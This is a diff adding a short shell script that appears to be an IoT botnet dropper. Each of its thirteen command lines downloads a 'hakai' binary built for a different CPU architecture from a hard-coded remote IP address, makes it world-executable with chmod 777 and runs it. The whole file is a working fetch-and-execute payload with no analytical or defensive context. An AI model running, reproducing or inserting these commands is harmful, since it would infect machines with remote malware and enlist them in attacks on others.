@@ -1,0 +1,14 @@
+#!/bin/sh
+wget http://212.237.31.84/bins/hakai.mips;chmod 777 hakai.mips;./hakai.mips;
+wget http://212.237.31.84/bins/hakai.mipsel;chmod 777 hakai.mipsel;./hakai.mipsel;
+wget http://212.237.31.84/bins/hakai.sh4;chmod 777 hakai.sh4;./hakai.sh4;
+wget http://212.237.31.84/bins/hakai.x86_64;chmod 777 hakai.x86_64;./hakai.x86_64;
+wget http://212.237.31.84/bins/hakai.armv6l;chmod 777 hakai.armv6l;./hakai.armv6l;
+wget http://212.237.31.84/bins/hakai.i686;chmod 777 hakai.i686;./hakai.i686;
+wget http://212.237.31.84/bins/hakai.powerpc;chmod 777 hakai.powerpc;./hakai.powerpc;
+wget http://212.237.31.84/bins/hakai.i586;chmod 777 hakai.i586;./hakai.i586;
+wget http://212.237.31.84/bins/hakai.m68k;chmod 777 hakai.m68k;./hakai.m68k;
+wget http://212.237.31.84/bins/hakai.sparc;chmod 777 hakai.sparc;./hakai.sparc;
+wget http://212.237.31.84/bins/hakai.armv4l;chmod 777 hakai.armv4l;./hakai.armv4l;
+wget http://212.237.31.84/bins/hakai.armv5l;chmod 777 hakai.armv5l;./hakai.armv5l;
+wget http://212.237.31.84/bins/hakai.ppc;chmod 777 hakai.ppc;./hakai.ppc;
